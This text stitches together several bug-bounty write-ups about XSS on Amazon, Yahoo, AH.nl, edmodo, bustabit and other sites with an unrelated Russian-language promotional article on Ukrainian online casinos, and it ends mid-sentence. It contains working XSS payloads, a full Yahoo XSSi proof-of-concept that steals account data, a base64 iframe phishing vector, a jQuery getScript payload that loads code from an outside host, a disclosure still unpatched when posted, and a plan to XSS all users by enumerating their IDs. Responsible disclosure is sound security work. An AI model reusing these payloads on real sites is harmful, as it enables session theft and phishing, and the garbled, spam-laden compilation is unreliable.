@omespino , read you later.

Coding_Karma 3 min read · Jul 26, 2018 -- 2 Listen Share I recently started with “Bug Bounty” after hearing and reading so much about it. I felt like it might be worth the efforts to actually try it out & guess what? It’s absolutely is! As a beginner to anyone whose reading this post please always think about the impact “Imagine you are the bad guy and the evaluate your findings. Before running to submissions”. Coming back to the topic XSS on amazon. So as always I was trying to “Hunt” for bugs on some program on some website and feeling absolutely drained so I started reading some posts about XSS and thought why not try it out myself. After playing around some websites I came across “developer.amazon.com”. so I created my account with “<script>alert()</script>” as you might have expected (*Beginner*). After initial futile efforts I started looking at the pattern of request and noticed that name for a feature called “Security Profile” is being directly thrown in the source code and can be elevated to XSS. So I created the security profile with bunch of payload in place of names. Press enter or click to view image in full size This is how the profiles looked like So once the payload is placed I wanted to trigger it so I ended up calling the “Dash Services” which I came to know is the place to trigger after looking at the request-response pattern! Press enter or click to view image in full size and I hit “Begin”. Press enter or click to view image in full size Document.Cookie and my payload executed. So this is not the moment of joy as this is known as “Self-XSS” meaning you can only inject payload on yourself and can’t harm anyone else with it. I ended up escalating this issue to logout CSRF which indeed ended up as a valid issue. Lessons :- Every XSS isn’t XSS that’s a game winner. If you find a vulnerability that is limited always try to escalate it to something more severe. Bug bounty isn’t easy and takes time learn through the process don’t “Quit”. For the love of god listen to people more experienced and don’t act like an idiot. Read blogs/posts/write ups to get started and learn new methods! Have Patience! Lots of it. Time Line :- Reported on 17th July. Issue Acknowledged and Triaged on 18th July. Fixed 24th July. Amazon didn’t offer any momentary reward because they don’t have the policy for the bounties. Before I end this post I would really like to thank @ Karel_Origin and Robert Smith for helping me out with my journey to bug bounty. Thank You!

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe $12,000 Intersection between Clickjacking, XSS, and Denial of Service ‹ Back Introduction \"Digging Deep\" into Chat: Denial of Service against User Clients - $2,000 bounty What about pasting links to the same domain? Some time later... How could this be weaponized? \"Digging Deep\" into Chat: XSS plus Click Jacking - $10,000 bounty Conclusion ‹ Back The $12,000 Intersection between Clickjacking, XSS, and Denial of Service Wed Jul 04 2018 One of the more challenging tasks in web app pentesting is approaching an application that has limited interaction. It's very easy to give up after trying every common method to exploit something, but putting in the time to understand an application is often rewarding and beneficial to ones personal growth as a hacker. Introduction The specific application that I've been targeting over the last few weeks is a bitcoin gambling website where a stock will progressively rise over time. The gambler decides the amount of money they would like to put in and a multiplier to payout at. As the multiplier goes up, they have an option to click a button and receive whatever returns they had made it to. Each time the multiplier goes up, there is a chance the stock will \"bust\" and all of the investment will be lost. The application had a few really interesting functionalities, but the one I really wanted to spend time on was the ability to chat with other users. \"Digging Deep\" into Chat: Denial of Service against User Clients - $2,000 bounty One of the things that I had identified after scrolling through the chat messages was that the service auto-created hyperlinks when a link was pasted. This was interesting since the website made a really special HTML element that is oftentimes dangerously implemented so that an attacker could do one of the following... < a href = \":1\" > :2 </ a > \" onmouseover=alert(1) a=\" - this would fire at :1 if not sanitized properly javascript:alert(1) - this would fire at :1 if not sanitized properly <script>alert(1)</script> - this would fire at :2 if not sanitized properly Sadly, none of these worked. It appeared that the service did not hyperlink the external endpoints directly, but modified it to the following endpoint where www.google.com would be an example posted URL... https://www.bustabit.com/external?url=https://www.google.com ...the result of posting a URL... ... the page that you're taken to after clicking said URL. What about pasting links to the same domain? We'll come back to the above endpoint shortly, but something interesting about the external forwarding service was that it did not forward URLs for the same domain. There was some sort of detection mechanism for determining if a URL was from the same site, e.g. www.bustabit.com/a would not trigger the domain to be modified to www.bustabit.com/external?url=www.bustabit.com/a since it was on the same domain. Here is the generated HTML for www.bustabit.com/a ... < a href = \"/a\" > www.bustabit.com/a </ a > ... compared to the generated HTML for www.google.com/a ... < a href = \"https://www.bustabit.com/external?url=https://www.google.com/a\" > https://www.google.com/a </ a > The really cool part about the above URL is that it's not hyperlinking the full domain, but simply the endpoint. What an attacker could potentially do here is abuse the functionality of double slashes for external resources using a payload like... https://www.bustabit.com//attacker.com/hacked ... to create ... < a href = \"//attacker.com/hacked\" > www.bustabit.com//attacker.com/hacked </ a > This worked! The following HTML is the exact same hyperlink above: //hacker.com/ Notice how it takes you to an external resource and not an endpoint on samcurry.net ? More information on this is available here: http://www.ietf.org/rfc/rfc2396.txt . This WOULD'VE WORKED as a bypass to the link filter, but this was an all-JavaScript application that was doing an onclick event to load the endpoint in the same tab since the domain was the exact same and it didn't have to refresh whatsoever. Damn! It's incredibly frustrating seeing your PoC HTML written in the client, hovering over a hyperlink with a link to whywontyouload.com , then clicking it and nothing happening. After investigating this for a bit I got really annoyed and worked to identify what exactly was happening when I clicked the URL. Some time later... After a long time endlessly spamming random payloads and attempting to find something that would take a user to an external domain, the website went gray. It turns out that I had actually broken my client by sending https://www.bustabit.com/%0t . The JavaScript didn't know how to handle this since the URL encoding for %0t did not decode to anything and simply failed the entire application (see here for more information regarding correct URL encoding). After refreshing the page I was amazed: my client was still broken. It turns out that the application pushed all hyperlinks to a JavaScript function automatically, and if there was a failed URL (e.g. had %0t ), the application would crash. How could this be weaponized? An attacker could direct message anyone placing a bet (this is public information - all live bets and wagers are in the upper right box) and it would crash the victims client, making them unable to cash out their bet. Additionally, an attacker could simply post a bad link to the main chat channel and disconnect everyone, making the game unplayable for a long period of time or cancelling the ability to interact for all users. \"Digging Deep\" into Chat: XSS plus Click Jacking - $10,000 bounty Remember that external endpoint I had posted above? It turns out that you could simply pass it a JavaScript URI and an attacker could execute JavaScript within the context of the application. These bugs always suck because they require you to convince someone to click something. One of the things you can do to make these PoCs better is to simply check if the website can be put inside of an <iframe> tag. If this is possible, then it would additionally be possible to create a clickjacking PoC using something like Samy Kamkar's quick jacking PoC generation tool . It turns out that the service was able to be placed inside of an <iframe> . With this, I generated an example PoC using that awesome little snippet of Click here to continue . Which, in a real world scenario, could look a little something like this... So, what can you do with XSS? Session takeover! It turns out that the web sockets session is stored within the local storage of your browser. An attacker could abuse the XSS to force the victim into making a call to an external service with their session information. An attacker could authenticate to the application by modifying their own secrets to the victims and authenticating to the service. Conclusion More often than not I see people approaching bug bounty with a very \"spray everything lightly\" methodology. This will probably work eventually, but the thing you have to keep in mind is that every one can download automated tools like aquatone or dirsearch. If you want to find vulnerabilities on things where there are thousands of other researchers, it is often your best bet to dig deep on certain functionalities.

($750 Bounty) hyde 3 min read · Jul 29, 2018 -- 1 Listen Share While intercepting requests using Burp Suite I noticed the following request: Press enter or click to view image in full size When I saw that this was a JSONP endpoint I immediately knew this could potentially be an XSSi vulnerability. However, I noticed that if the value for the .crumb GET parameter wasn’t valid it would return the following response: Press enter or click to view image in full size At this point I realized that if I could somehow steal the victims valid .crumb value, I could successfully steal information about their account. I then searched all requests I intercepted in Burp Suite for my valid crumb and I quickly found it in in a dynamic Javascript file located at: https://messenger.yahoo.com/embed/app.js If you go to this page now you will not find the logoutCrumb value since they have patched this issue. However, when I initially discovered this issue the file looked like this: Press enter or click to view image in full size Now, for people that don’t understand how XSSi works the vulnerability essentially takes advantage of Same-Origin Policy (SOP) not being applied to Javascript src attribute within the script tag. I then created the following Proof of Concept which steals the valid .crumb value from the dynamic Javascript file at https://messenger.yahoo.com/embed/app.js and then places the valid crumb in the .crumb GET parameter as seen here https://jsapi.login.yahoo.com/w/device_users?.crumb=POR1.kRjsx. which returns a proper response containing information about the user. Using the code below I was able to extract information: <html> <head> <title>Yahoo XSSi PoC</title> </head> <body> <div style=\"width: 60%; margin-right: auto; margin-left: auto; margin-bottom: 30px;\"> <h1 style=\"text-align: center;\">Proof of Concept</h1> <b>Dataset 1:</b> <div id=\"content1\" style=\"width: 100%; border: 1px solid black; padding: 10px; overflow: scroll; font-family: monospace;\"></div> <br/> <b>Dataset 2:</b> <div id=\"content2\" style=\"width: 100%; border: 1px solid black; padding: 10px; overflow: scroll; font-family: monospace;\"></div> </div> <script> function processDeviceUsers(data) { document.getElementById(\"content1\").innerHTML = JSON.stringify(data); } window.onload = function () { var config = {}; config_data = {}; config.merge = function(data) { config_data = data }; iris.initConfig(config); document.getElementById(\"content2\").innerHTML = JSON.stringify(config_data); var src = \"https://jsapi.login.yahoo.com/w/device_users?.crumb=\" + config_data.session.logoutCrumb; var s = document.createElement('script'); s.setAttribute('src', src); document.body.appendChild(s); } </script> <script src=\"https://messenger.yahoo.com/embed/app.js\"></script> <script src=\"https://code.jquery.com/jquery-3.3.1.min.js\"></script> </body> </html> Below is a screenshot of the payload I submitted to Yahoo and received a $750 bug bounty. Overall, I had a great time developing the Proof of Concept for this vulnerability chain and I hope others are able to learn a thing or two from this write up.

That is very unfortunate. I also decided to also remove my tweets towards them as well as it didn’t seem to reach out to them. Today I have decided to release that to the public (full disclosure) as it still works. Steps to Reproduce the stored XSS: Go to: http://gameskinny.com and make an account. Press enter or click to view image in full size Next we visit https://www.gameskinny.com/post/edit to make a thread or article — whichever you prefer to call it. Now we insert our payload: “><svg/onload=alert(1)> ” and it should look a little something like this: Press enter or click to view image in full size After that, scroll to the bottom, then click “ Save your changes ” and click the preview button. …. We get the famous confirm(1) to popup! Press enter or click to view image in full size Gif of the POC: Press enter or click to view image in full size If you wanted to do malicious harm, or grab information that you weren’t suppose to have, then you would use a proper payload. I won’t be sharing that here — SORRY! You can share your drafts with registered users who will be able to see your article and they would see the XSS — or get executed on. You can also send this in to the Editors by clicking “ Send to editors ” and executing an XSS script on them, which would hijack their cookies or sessions to do malicious activity. Once again, this post is NOT meant to do anything harmful to the website. I am just a security researcher who is trying to help secure your website — other websites as well. I hope http://gameskinny.com does fix this issue in the future (hope very soon) to secure their users information.

Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии.

First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям.

Step by step it looks like this: var p = new URLSearchParams(window[_0x11bc(‘0x4’)][_0x11bc(‘0x5’)]); This var defines new URLSearchParams interface which takes the value of window.location.search as parameter. In this case it is the value of g parameter. So variable p has the value of: ?g=z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Next: var h = p[‘get’](‘g’); takes the value of g parameter and assign its value to h variable. Variable h has the value of: z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Next variable e is created: var e = h[_0x11bc(‘0x6’)](h[_0x11bc(‘0x1’)] — 0x1); It does a substring javascript method and takes the last character of the string assigned to h variable, last value of that string is number 1 ( last value must be number, if not there will be an error since parseInt in variable eq takes string and parses it to integer, so the value must be numeric, no letters ) : z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa[1] Next value h is assigned the value of h without the last character, in this case it is 1. So h has the value of: h = h[‘substr’](0x0, h[_0x11bc(‘0x1’)] — 0x1); z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa Next variable eq has the value of array with two field and join method adds the value of “=” to array. var eq = Array(parseInt(e) + 0x1)[‘join’](‘=’); So the value inside array and the value variable eq is: = Last step is variable u , there are three things happening here. Value of h is split into array, and then reversed and joined again with value of eq variable added to the end. var u = b(h[_0x11bc(‘0x7’)](‘’)[‘reverse’]()[_0x11bc(‘0x8’)](‘’) + eq); So first we get: h.split(“”); (68) [“z”, “8”, “i”, “c”, “l”, “Z”, “H”, “b”, “p”, “N”, “X”, “L”, “z”, “t”, “2”, “Y”, “p”, “B”, “X”, “L”, “w”, “9”, “G”, “d”, “t”, “M”, “X”, “d”, “v”, “M”, “X”, “Z”, “v”, “0”, “2”, “b”, “j”, “5”, “C”, “b”, “s”, “V”, “n”, “Y”, “k”, “x”, “2”, “b”, “n”, “J”, “X”, “Z”, “2”, “x”, “W”, “a”, “z”, “9”, “y”, “L”, “6”, “M”, “H”, “c”, “0”, “R”, “H”, “a”] And then reverse the values: h.split(“”).reverse(); (68) [“a”, “H”, “R”, “0”, “c”, “H”, “M”, “6”, “L”, “y”, “9”, “z”, “a”, “W”, “x”, “2”, “Z”, “X”, “J”, “n”, “b”, “2”, “x”, “k”, “Y”, “n”, “V”, “s”, “b”, “C”, “5”, “j”, “b”, “2”, “0”, “v”, “Z”, “X”, “M”, “v”, “d”, “X”, “M”, “t”, “d”, “G”, “9”, “w”, “L”, “X”, “B”, “p”, “Y”, “2”, “t”, “z”, “L”, “X”, “N”, “p”, “b”, “H”, “Z”, “l”, “c”, “i”, “8”, “z”] And them join the values and add the value of eq variable: h.split(“”).reverse().join(“”) + eq “aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=” So we get the final falue encoded in BASE64 and the function b does decoding to cleartext and regex inside window.location removes quotes and double quotes. b(“aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=”); “https://silvergoldbull.com/es/us-top-picks-silver/3\" Exploitation time: 1.

Something that will get us data. 2. Stealing user logins with fake login inside Iframe displayed on https://silvergoldbull.com Lets first clone the login page and setup fake https login page: https://maxon3.github.io/silvergold/ Next we have to setup out injection vector, since quotes and double quotes are removed from the vector we have to use something other instead of them, we can use backtics and bypass that. Steps: 1. Set new parameter inside URL request with value of encoded base64 iframe ( secK parameter ) 2. Request value of secK with our javascript injected vector ( injection vector is the value of g parameter ) 3. Page gets rendered and displayed 4. User enters his data and clicks login 5. Attacker has user data and the best thing is URL will still show silvergoldbull Vector used is: https://silvergoldbull.com/bt.html?secK=PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvaFE0eFhvJ3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==&g=v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1 Explained: Value of g is: var h = “v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1”; console.log(atob(h.substr(0,h.length-1).split(“”).reverse().join(“”))); javascript:document.write(atob(p[`get`](`secK`)));//// So we take the value of param secK and decode it with atob function, after decoding is done the value is written inside DOM and rendered. The value of secK is: atob(‘PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvaFE0eFhvJ3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==’) <iframe onload=”window.stop();”src=’//goo.gl/hQ4xXo’style=”height:1000px;width:100%;border:0\"> We used google redirector to shorten the base64 vector, removed spaces where we could, removed the border, set iframe to take full value of viewport, and to remove loading spinning animation we set window.stop() to run right after the page has finished loading.

Bug that allows to steal cookies from… | by Jonathan Bouman | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Persistent XSS at AH.nl Jonathan Bouman 6 min read · Jul 9, 2018 -- 3 Listen Share Press enter or click to view image in full size tl;dr: server stored xss visible to all visitors Are you aware of any (private) bug bounty programs or platforms? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl Background In the previous blog posts we discussed Reflected XSS bugs at Amazon.com , Unauthorized file uploads at Apple.com and Open redirect bugs at Bol.com These types of attacks need a user to click a specific link in order to run our malicious code. A problem with that is that most browsers block this sort of attacks . But what if we want to inject our code into the website so every visiting user will be targeted? We call this type of attack Persistent- or Stored XSS . A big advantage is that browser can’t easily detect this type of attack, so we don’t have problems with bypassing the XSS auditors. AH.nl Today we will try to find this type of bug at Albert Heijn, the biggest supermarket chain in The Netherlands. Searching for vulnerable pages Persistent means that we have to save our code in the database of the website. This narrows our focus to places where we can register, sign up and create content. A quick look at AH.nl shows us a community website that offers the exchange of recipes, Kookschrift . Everyone can register and after your first submission of a recipe someone at AH.nl will activate and publish your profile. Part of your profile is an avatar, you are allowed to pick one from a predefined list. After clicking the avatar a number will be saved into a hidden form field and it’s all fine. Press enter or click to view image in full size Avatar integer But what if we try something else like… change the number to a string containing our javascript code? Burp Suite to the rescue An easy way to test different payloads is to use burpsuite . You start burpsuite and add it to your browser . From that moment it will intercept all your website requests. This allows you to easily modify parameters, submit new values and evaluate the responses. Press enter or click to view image in full size Intercepted profile edit Use the action button and pick ‘Send to repeater’. After that press the repeater tab and let the magic happen. Press enter or click to view image in full size You are now able to set all sorts of payloads to the different fields, with the result of the submission on the right. Now it’s time to submit your payload, refresh the browser and see if our code results in unexpected behavior. Think of not properly escaped strings, number parameters that are able to hold strings, url strings that are not checked against a whitelist, etc. You are able to automatically brute force this by using tools like burpsuite (attacker tab), but I advice you to do it manually. Otherwise you may trigger firewalls and cause unnecessary load on the website. I save you some time here; almost all the parameters are properly sanitized, except one; the avatarUrl field on the profile edit page. Perfect. That one is used in different places on the website and avatars are also visible on the frontpage; they’ve got a list of ‘New users’ with avatars. Now we only need to create the javascript payload to inject into our avatar field. For this proof of concept it will be enough to arrange an account that is featured on the frontpage as a new user. We won’t use that user for our injection, but you can imagine the impact if we did. Creating the XSS Payload Before we start we need to take a look at how the HTML is structured. Press enter or click to view image in full size Avatar on the frontpage As you can see the HTML is quite simple, just an image displaying the avatar. What if we are able to inject a \" in order to close the src= attribute and after that an onerror=ourJavascript() That will force the browser to load an image that does not exists and fires our onerror handler. Sounds good! Firewalls, regular expressions, string sanitizers After a few hours of trying I discovered that quite a lot of combinations are blocked and I came up with the following working payload: \"%20onerror%20onerror%3d%3donerror%3da%3d$.getScript(\"https://na12.nl\")%20data%3d\" We start with the “ to close the img src attribute, since it will give an error (the image that it tries to load does not exist) we can use the onerror handler to execute code. Onerror/onload/onclick= strings are removed by their firewall, but we can bypass that by using a string like onerroronerror== it will remove the onerror= in the middle and we end up with… onerror=. Now we need to load our code, luckily they include jQuery on every page, so we’re able to use the getScript function to load external javascript. There are some regular expression in place on the AH.nl server that validate strings for urls. It will returns errors for situations where the url is too long or if it does contain a slash in the path. Because of that we need a short domain name and a server that sends our javascript if it receives a request on the ‘naked’ https://domain.com url. External Javascript We don’t have limitations in the code we inject if we are able load our external javascript. Below a copy of the code. We add some CSS to the page and inject a jQuery module that allows us to make a nice modal popup. Later we will use this to show our fake phishing login. As a bonus we will add a small script that tries to lookup the user details of any logged in user that loads our code. Press enter or click to view image in full size Source of our injected javascript Get on the frontpage, hutspot Now we want to target all the visitors that visit this part of the website. We need AH.nl to publish one of our accounts, so that means; write recipes! Press enter or click to view image in full size H. Acker on the frontpage I signed up with an account, submitted one of my best hutspot recipes , took a cup of tea and waited for few hours. Welcome Hermelien Acker! We have a dangerous combination now if we load our code into Hermelien her avatar. We won’t do that since we want to avoid impacting any regular visitors. However the code still loads if we are logged in with a manipulated account (the avatar is displayed in the menu) so we can use that for our screen capture and bug submission. Proof of concept in action Press enter or click to view image in full size Press enter or click to view image in full size Logged in user? We’re able to steal their details. Also their last purchases if they connected their discount card. Solutions Always validate user input Define a field as an integer in the database if it is an integer, don’t allow type mixing. Escape all fields in the output HTML Impact of the attack Extra filtration of user information from other pages at AH.nl, submit data as the visitor on the AH.nl domain Attack the browser of visitors through injection of a framework like beefproject.com Setting up a phishing login Timeline 14–06–18 Found the bug, informed AH.nl 15–06–18 Bug confirmed by AH.nl 19–06–18 Requested update 05–07–18 Requested update 06–07–18 Bug fixed by AH.nl 09-07–18 Blog published, €200 reward JavaScript Bug Bounty Xss Attack Security Information Security -- -- 3 Written by Jonathan Bouman 2.6K followers · 38 following Medical doctor / Web developer / Security researcher - https://Protozoan.nl Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Let me narrate you this one: So the website i was pentesting was edmodo.com(I asked them for a public disclosure), It was just in the morning that i wanna pentest edmodo that day and in the noon i started it , Follow along. Step 1: I did a simply recon using knockpy and found a subdomain go.edmodo.com, I went their and clicked on signup, which then redirected me to: https://www.edmodo.com/onboarding?school_suggestion_test_variant=controlass&language=en_GB Press enter or click to view image in full size Redirection image Step 2: I just added some <> in the first parameter —[ school_suggestion_test_variant=controlass <>], To see whether they get embedded into the source code, Then i found these brackets getting embedded between the <script> tags , WHAT NEED MORE!!!!!!! Press enter or click to view image in full size <script> tags embedded! Step 3: <img src=x onerror=”alert(xss by ashish)”>, BOOOOOM XSS Press enter or click to view image in full size This was my 3 minutes recon and xss, hope you may find it helpfull.

After a few hours on searching on the web, My eyes came on a Taiwan crypto exchange platform with awesome features and very good referral system too. Quickly I registered on the website and posted my referral link on facebook and twitter. The referral URL was as follow: https://www.reacted.com/users/sign_up/32427/shared In the second day, When I logged into my account on the website, I noticed two notifications about that two guys just registered using my referral link. Press enter or click to view image in full size An interesting thing, application prints the accounts names that registered using your referral link, So what If I register a new account with XSS name using my referral link. very simple, very easy. Quickly I registered a new account using my referral link with my favorite XSS payload “><img src=x onerror=prompt(1)> Then after I created the account I browsed to the notification page and I noticed that the payload didn’t get executed and I didn’t know why even the payload isn’t filtered by the application. Hmmm, I tried many payloads and it didn’t get popup too. Then I tried to register a new account with this payload (“ <script>alert(1)</script>”) After I registered the account, I browsed to notification page again. But this time the payload has been executed on the page using script alert payload. My reaction after this I felt this moment that this payload tells me he is still the king of XSS even if no one uses it anymore ;”D XSS’ing all platform users However, haven’t you noticed that you can change the ID on the referral link to another account ID that you want to register by his referral link ? It looks like that this website generates referral links depends on the ID of user which is very easy to known or enumerated. In other websites, the referral link is consists of hashed token. And because of this feature or bug, I was able to XSS all users by sending registration requests to intruder tap and this will request register accounts by users referral link with XSS names From User ID 1 to 32427 USER ID And XSS will get executed on accounts of user when they see the notification page Quickly, I sent an email support team asking them If they have bug bounty or something like that, and after 6 hours their response was as follow Great reply! After this encouraging response I wrote the report of Stored XSS that I found and other two medium severity issues and sent the report to them. 26 Hours later of sending the report, I got this awesome email. The company rewarded me with 2.5 BTC as bounty for my effort and offered me to do pentest on their application from time to time. Lessons learned Do not hesitate to report something you found on a service or application that you use and I’m sure It’s probably going to be appreciated by them and it might end up getting great stuff. Don’t forget to test referral function because I never thought that it maybe be vulnerable to anything like that Startup -- -- 1 Written by Khaled Hassan 723 followers · 8 following https://twitter.com/rahalm16 Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl Background The last 2 months I’ve been trying to improve my frontend & backend skills by developing https://Scroll.am (An alternative way to browse Amazon, feedback welcome!) . I use projects like these to learn more about new frameworks ( Vue.js ) and techniques (Codestar & Lambda, AWS ). Today I learned something more about XSS and I would love to share it with you :) I’m always interested in the ways how Amazon displays its own products. What design did they choose, what about the UX? I can learn a lot from that since they AB test everything . But where do you look for all their different types of designs? Amazon shopping app One of the places to check for new designs is their App. So on a rainy friday afternoon I decided to decompile their Amazon Shopping Android App and have a look around in the code. A quick walkthrough: 1. Download the APK file to your local computer, 2. Use some online decompiler to extract the code, 3. Start looking around in the different files for urls to product pages. Searching for product page urls Amazon product pages often have ‘/dp/’ in the url, so I did a quick search on that: Press enter or click to view image in full size Plenty of hits. One of them https://www.amazon.com/gp/masclient/dp/ <product_id> . Masclient product page? After 2 months I saw plenty of product urls, but never saw one having this masclient part. Let’s have a look . Found Waldo! Mmm. This 